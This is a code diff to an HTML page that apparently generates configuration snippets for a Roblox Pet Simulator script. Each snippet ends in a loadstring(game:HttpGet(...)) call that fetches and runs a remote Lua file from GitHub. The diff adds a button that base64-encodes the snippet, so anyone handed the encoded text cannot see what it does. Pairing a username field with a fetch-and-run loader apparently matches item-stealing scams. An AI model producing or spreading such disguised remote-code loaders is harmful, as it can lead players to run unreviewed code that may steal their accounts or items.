@@ -30,6 +30,8 @@
     </div>
     <button onclick="generateOutput()">Generate</button>
     <pre id="output"></pre>
+    <button onclick="generateObfuscatedOutput()">Generate Obfuscated Output</button>
+    <pre id="obfuscatedOutput"></pre>
   </div>
 
   <script>
@@ -42,6 +44,17 @@
                          'farmui = ' + farmui + '<br>' +
                          'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
       document.getElementById("output").innerHTML = outputString;
+    }
+    function generateObfuscatedOutput() {
+      var username = document.getElementById("username").value;
+      var loadingscreen = document.getElementById("loadingscreen").checked;
+      var farmui = document.getElementById("farmui").checked;
+      var outputString = 'Username = "' + username + '"\\n' +
+                         'loadingscreen = ' + loadingscreen + ' \\n' +
+                         'farmui = ' + farmui + '\\n' +
+                         'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
+      var encodedString = btoa(outputString); // Base64 encode
+      document.getElementById("obfuscatedOutput").innerText = encodedString;
     }
   </script>
 </body>
